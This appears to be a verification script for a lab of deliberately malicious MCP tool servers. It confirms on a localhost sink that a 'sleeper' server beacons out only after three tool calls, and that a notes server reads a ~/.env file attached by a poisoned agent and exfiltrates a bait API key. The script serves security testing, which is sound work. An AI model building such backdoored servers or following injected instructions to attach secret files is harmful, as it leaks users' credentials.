#!/usr/bin/env node
// Behavioral checks that need a sink + timing (driven by verify.sh):
//   - sleeper-mcp beacons only AFTER N tool calls, not before
//   - notes-mcp reads and exfiltrates a path the (poisoned) agent attaches
// Uses an in-process HTTP sink on a random port; nothing leaves localhost.
import http from 'node:http';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const DIR = path.dirname(fileURLToPath(import.meta.url));
let pass = 0, fail = 0;
const ok = (m) => { console.log('  PASS: ' + m); pass++; };
const bad = (m) => { console.log('  FAIL: ' + m); fail++; };

function tmp() { return fs.mkdtempSync(path.join(os.tmpdir(), 'reactor-verify-')); }

function startSink() {
  const hits = [];
  return new Promise((resolve) => {
    const srv = http.createServer((req, res) => {
      let b = '';
      req.on('data', (c) => (b += c));
      req.on('end', () => { hits.push({ url: req.url, body: b }); res.end('ok'); });
    });
    srv.listen(0, '127.0.0.1', () => resolve({ srv, port: srv.address().port, hits }));
  });
}

// Write frames to the server's stdin but DO NOT close it — a real server stays
// alive so its fire-and-forget fetch can finish. We kill it after waitMs.
function drive(serverRel, frames, env, waitMs = 600) {
  return new Promise((resolve) => {
    const child = spawn('node', [path.join(DIR, serverRel)], { env: { ...process.env, ...env } });
    let out = '';
    child.stdout.on('data', (d) => (out += d));
    for (const f of frames) child.stdin.write(JSON.stringify(f) + '\n');
    setTimeout(() => { try { child.kill(); } catch {} resolve(out); }, waitMs);
  });
}

const init = { jsonrpc: '2.0', id: 1, method: 'initialize', params: {} };
const inited = { jsonrpc: '2.0', method: 'notifications/initialized' };
const call = (id, name, args) => ({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } });

async function main() {
  const { srv, port, hits } = await startSink();
  const sink = `http://127.0.0.1:${port}`;

  // --- sleeper-mcp: silent through 2 calls, beacons on the 3rd (default N=3).
  hits.length = 0;
  await drive('sleeper-mcp/server.mjs', [init, inited, call(2, 'ping', { host: 'a' }), call(3, 'status', {})],
    { REACTOR_SINK_HTTP: sink, REACTOR_STATE_DIR: tmp() });
  if (hits.length === 0) ok('sleeper-mcp: no beacon after 2 calls'); else bad(`sleeper-mcp beaconed too early (${hits.length})`);

  hits.length = 0;
  await drive('sleeper-mcp/server.mjs', [init, inited, call(2, 'ping', { host: 'a' }), call(3, 'ping', { host: 'b' }), call(4, 'status', {})],
    { REACTOR_SINK_HTTP: sink, REACTOR_STATE_DIR: tmp() });
  if (hits.some((h) => h.url.startsWith('/checkin'))) ok('sleeper-mcp: beacon fired on 3rd call'); else bad('sleeper-mcp: no beacon after 3 calls');

  // --- notes-mcp: attach a bait path -> server reads it and exfils to the sink.
  const home = tmp();
  fs.writeFileSync(path.join(home, '.env'), 'OPENAI_API_KEY=sk-proj-BAITMARKER-9f9f9f\n');
  hits.length = 0;
  await drive('notes-mcp/server.mjs', [init, inited, call(2, 'search', { q: 'standup', attach: '~/.env' })],
    { REACTOR_SINK_HTTP: sink, REACTOR_STATE_DIR: tmp(), HOME: home });
  if (hits.some((h) => h.body.includes('BAITMARKER-9f9f9f'))) ok('notes-mcp: attached ~/.env exfiltrated to sink'); else bad('notes-mcp: no exfil of attached path');

  srv.close();
  console.log(`\nbehavioral: ${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
}
main();
